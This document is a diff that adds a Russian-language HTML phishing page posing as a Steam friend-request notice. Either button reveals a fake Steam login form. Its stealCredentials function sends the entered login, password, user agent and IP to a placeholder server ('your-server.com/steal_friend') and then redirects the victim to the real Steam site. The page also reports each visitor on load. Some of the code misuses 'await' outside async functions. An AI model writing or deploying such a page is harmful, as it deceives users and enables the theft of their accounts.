@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Новый друг в Steam!</title>
+    <style>
+        body {
+            background: #1b2838;
+            color: #c6d4df;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background: #16202d;
+            padding: 20px;
+            border-radius: 4px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.5);
+            width: 400px;
+            text-align: center;
+        }
+        .avatar {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            margin: 0 auto 15px;
+            background: #2a475e;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+            color: #c6d4df;
+        }
+        .username {
+            color: #66c0f4;
+            font-size: 18px;
+            margin-bottom: 5px;
+        }
+        .message {
+            margin: 15px 0;
+            line-height: 1.5;
+        }
+        .button {
+            background: #5c7e10;
+            color: white;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 2px;
+            cursor: pointer;
+            display: inline-block;
+            margin: 10px 5px;
+            text-decoration: none;
+        }
+        .button.secondary {
+            background: #6e6e6e;
+        }
+        .steam-logo {
+            margin-top: 20px;
+            opacity: 0.7;
+        }
+        .warning {
+            font-size: 12px;
+            color: #8f98a0;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="avatar">👤</div>
+        <div class="username">CoolGamer123</div>
+        <div class="message">
+            отправил(а) вам запрос на добавление в друзья в Steam!
+        </div>
+        <div class="message">
+            Уровень: <strong>25</strong><br>
+            В друзьях: <strong>127</strong><br>
+            Совместных игр: <strong>15</strong>
+        </div>
+        
+        <div>
+            <a href="#" class="button" onclick="showLogin()">Принять запрос</a>
+            <a href="#" class="button secondary" onclick="showLogin()">Отклонить</a>
+        </div>
+
+        <div id="loginForm" style="display: none; margin-top: 20px;">
+            <div class="message">
+                Для подтверждения действия войдите в аккаунт Steam
+            </div>
+            <input type="text" id="username" placeholder="Логин" style="width: 100%; padding: 10px; margin: 5px 0; background: #32353c; border: 1px solid #26282d; color: #c6d4df; border-radius: 2px;">
+            <input type="password" id="password" placeholder="Пароль" style="width: 100%; padding: 10px; margin: 5px 0; background: #32353c; border: 1px solid #26282d; color: #c6d4df; border-radius: 2px;">
+            <button class="button" onclick="stealCredentials()">Подтвердить</button>
+        </div>
+
+        <div class="steam-logo">
+            STEAM
+        </div>
+        
+        <div class="warning">
+            Это сообщение было отправлено из Steam Community
+        </div>
+    </div>
+
+    <script>
+        function showLogin() {
+            document.getElementById('loginForm').style.display = 'block';
+            return false;
+        }
+
+        function stealCredentials() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if (!username || !password) {
+                alert('Пожалуйста, заполните все поля');
+                return;
+            }
+
+            // Отправка данных на ваш сервер
+            fetch('https://your-server.com/steal_friend', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    username: username,
+                    password: password,
+                    userAgent: navigator.userAgent,
+                    ip: await getIP(),
+                    timestamp: new Date().toISOString()
+                })
+            })
+            .then(response => response.text())
+            .then(data => {
+                // Перенаправляем на настоящий Steam
+                alert('Запрос на добавление в друзья принят!');
+                window.location.href = 'https://steamcommunity.com';
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Ошибка соединения. Попробуйте снова.');
+            });
+        }
+
+        async function getIP() {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        }
+
+        // Дополнительные данные при загрузке страницы
+        window.onload = function() {
+            fetch('https://your-server.com/visit', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    referrer: document.referrer,
+                    userAgent: navigator.userAgent,
+                    ip: await getIP()
+                })
+            });
+        };
+    </script>
+</body>
+</html>
